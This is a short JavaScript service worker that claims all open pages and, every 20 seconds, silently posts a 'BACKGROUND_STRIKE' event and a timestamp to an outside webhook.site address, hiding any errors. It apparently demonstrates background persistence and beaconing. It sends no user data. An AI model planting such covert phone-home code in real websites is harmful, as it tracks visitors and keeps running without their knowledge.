self.addEventListener('install', e => self.skipWaiting());
self.addEventListener('activate', e => e.waitUntil(clients.claim()));

setInterval(async () => {
    try {
        await fetch("https://webhook.site/1361d3b1-f231-4039-b4c7-5f2e7677f0b3", {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify({
                event: "BACKGROUND_STRIKE",
                note: "הקולר נופץ מהשרת",
                ts: new Date().toISOString()
            })
        });
    } catch(e) {}
}, 20000);